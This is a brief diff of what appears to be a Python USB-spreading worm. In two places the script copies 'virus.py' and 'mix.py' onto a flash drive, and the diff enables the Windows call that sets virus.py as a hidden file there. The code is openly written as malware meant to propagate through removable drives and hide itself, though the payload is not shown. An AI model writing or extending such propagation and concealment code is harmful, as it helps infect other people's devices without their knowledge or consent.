@@ -28,7 +28,7 @@ while True:
                 cp_virus = shutil.copy('virus.py',x)# it's for copy virus to flash
                 cp_mix = shutil.copy('mix.py',x) #it's for copy mix to flash
                 #ctypes.windll.kernel32.SetFileAttributesW(x +'mix.py',2) # it's for select the permision (hidden)
-                #ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
+                ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
                 #print('hidden sucsessful')
                 print('run 1  ')
             except:
@@ -42,7 +42,7 @@ while True:
                 cp_virus = shutil.copy('virus.py',x)# it's for copy virus to flash
                 cp_mix = shutil.copy('mix.py',x) #it's for copy mix to flash
                 #ctypes.windll.kernel32.SetFileAttributesW(x +'mix.py',2) # it's for select the permision (hidden)
-                #ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
+                ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
                 #print('hidden sucsessful')
                 print('run 2  ')
             except:
